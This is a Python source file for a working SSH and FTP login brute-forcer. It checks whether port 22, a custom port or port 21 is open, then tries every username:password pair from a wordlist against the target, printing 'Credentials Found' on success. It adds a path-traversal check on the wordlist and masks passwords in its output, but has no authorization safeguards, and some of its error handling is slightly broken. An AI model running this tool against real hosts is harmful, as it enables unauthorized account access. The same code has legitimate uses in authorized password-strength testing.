import paramiko,requests,socket
from ftplib import FTP
import getpass
import os


def _validate_wordlist_path(wordlist, default_path):
    if wordlist == '':
        return default_path
    # Resolve absolute paths
    abs_wordlist = os.path.abspath(wordlist)
    abs_default_dir = os.path.abspath(os.path.dirname(default_path))
    # Ensure the wordlist path is inside the default directory
    if not abs_wordlist.startswith(abs_default_dir + os.sep):
        raise ValueError("Invalid wordlist path: Path traversal detected or not allowed.")
    if not os.path.isfile(abs_wordlist):
        raise FileNotFoundError(f"Wordlist file not found: {abs_wordlist}")
    return abs_wordlist


def ssh(host, port):
    print("1. Default Port (22)")
    print("2. Custom Port")
    choice = int(input(">> "))
    if choice == 2:
        port = int(input("Enter the Custom Telnet Port : "))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            connect = s.connect_ex((host, port))
            if connect != 0:
                print("[+] Port %s: Closed" %port)
                s.close()

            elif connect == 0:
                print("[+] Port %s: Open" %port)
                s.close()
                wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
                try:
                    wl_path = _validate_wordlist_path(wordlist, "src/telnet.ini")
                    with open(wl_path, "r") as f:
                        f1 = f.readlines()
                except (ValueError, FileNotFoundError) as e:
                    print(f"Error loading wordlist: {e}")
                    return

                for x in f1:
                    y = x.split(':')
                    if len(y) < 2:
                        continue
                    username = y[0].strip()
                    # Do not print or store password in plaintext
                    password = y[1].strip()
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print("Checking with Username : %s , Password : [HIDDEN]" % (username))
                    try:
                        ssh_client.connect(host, port=port, username=username, password=password, timeout=10)
                        flag = 0

                    except paramiko.AuthenticationException:
                        flag = 1

                    except socket.error as e:
                        flag = 2
                        print(e)

                    except KeyboardInterrupt:
                        print("\n User Interrupt! Exitting...")
                        exit()

                    ssh_client.close()

                    if flag == 0:
                        print('')
                        print("Credentials Found")
                        print("Username : %s" % username)
                        print(("Password : [HIDDEN]"))
                        print('')
                    elif flag == 1:
                        print("Invalid Credentials")

                    else:
                        pass
        except socket.error as e:
            print("Error : %s" %e)

    elif choice == 1 or choice != 2:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        try:
            connect = s.connect_ex((host, 22))
            if connect != 0:
                print("[+] Port 22: Closed")
                s.close()

            elif connect == 0:
                print("[+] Port 22: Open")
                s.close()
                wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
                try:
                    wl_path = _validate_wordlist_path(wordlist, "src/telnet.ini")
                    with open(wl_path, "r") as f:
                        f1 = f.readlines()
                except (ValueError, FileNotFoundError) as e:
                    print(f"Error loading wordlist: {e}")
                    return

                for x in f1:
                    y = x.split(':')
                    if len(y) < 2:
                        continue
                    username = y[0].strip()
                    # Do not print or store password in plaintext
                    password = y[1].strip()
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    print("Checking with Username : %s , Password : [HIDDEN]" % (username))
                    try:
                        ssh_client.connect(host, port=22, username=username, password=password, timeout=10)
                        flag = 0

                    except paramiko.AuthenticationException:
                        flag = 1

                    except socket.error as e:
                        flag = 2
                        print(e)

                    except KeyboardInterrupt:
                        print("\n User Interrupt! Exitting...")
                        exit()

                    ssh_client.close()

                    if flag == 0:
                        print('')
                        print("Credentials Found")
                        print("Username : %s" % username)
                        print(("Password : [HIDDEN]"))
                        print('')
                    elif flag == 1:
                        print("Invalid Credentials")

                    else:
                        pass
        except socket.error as e:
            print("Error : %s" % e)


def ftp(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 21
    s.settimeout(10)
    try:
        connect = s.connect_ex((host, port))
        if connect != 0:
            print("[+] Port %s: Closed" % port)
            s.close()

        elif connect == 0:
            print("[+] Port %s: Open" % port)
            s.close()
            wordlist = input("Enter Wordlist location (Press Enter for Default Wordlist) : ")
            try:
                wl_path = _validate_wordlist_path(wordlist, "src/ftp.ini")
                with open(wl_path, "r") as f:
                    f1 = f.readlines()
            except (ValueError, FileNotFoundError) as e:
                print(f"Error loading wordlist: {e}")
                return

            for x in f1:
                y = x.split(':')
                if len(y) < 2:
                    continue
                username = y[0].strip()
                # Do not print or store password in plaintext
                password = y[1].strip()
                ftp_client = FTP(host)
                print("Checking with Username : %s , Password : [HIDDEN]" % (username))
                try:
                    ftp_client.login(user=username, passwd=password)
                    flag = 0

                except Exception as e:
                    flag = 1

                except socket.error as e:
                    flag = 2
                    print(e)

                except KeyboardInterrupt:
                    print("\n User Interrupt! Exitting...")
                    exit()

                if flag == 0:
                    print('')
                    print("Credentials Found")
                    print("Username : %s" % username)
                    print("Password : [HIDDEN]")
                    print('')
                elif flag == 1:
                    print("Invalid Credentials")

                else:
                    pass

    except socket.error as e:
        print("Error : %s" % e)
